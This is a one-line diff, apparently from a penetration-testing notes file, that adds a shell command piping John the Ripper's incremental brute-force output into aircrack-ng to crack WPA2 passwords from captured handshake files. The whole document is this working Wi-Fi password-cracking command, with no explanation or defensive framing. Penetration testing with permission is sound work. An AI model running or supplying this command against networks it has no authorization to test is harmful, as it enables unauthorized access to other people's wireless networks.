@@ -1,0 +1,1 @@
+/pentest/password/jtr/john --stdout --incremental:all | aircrack-ng -b mac -w - /tmp/wpa2*.cap
